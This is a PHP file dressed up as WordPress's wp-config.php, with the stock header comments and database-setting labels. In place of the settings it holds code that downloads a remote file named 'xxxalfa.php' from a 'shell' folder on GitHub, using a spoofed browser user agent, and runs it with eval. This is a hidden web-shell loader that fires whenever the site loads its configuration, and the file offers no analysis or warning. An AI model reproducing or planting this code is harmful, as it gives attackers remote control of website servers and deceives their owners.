<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
$ch = curl_init('https://raw.githubusercontent.com/sajapastipasti-afk/assets/refs/heads/main/shell/xxxalfa.php');

/** Database username */
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

/** Database password */
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');

/** Database hostname */
$content = curl_exec($ch);

/** Database charset to use in creating database tables. */
curl_close($ch);

/** The database collate type. Don't change this if in doubt. */
eval('?>'.$content);
?>
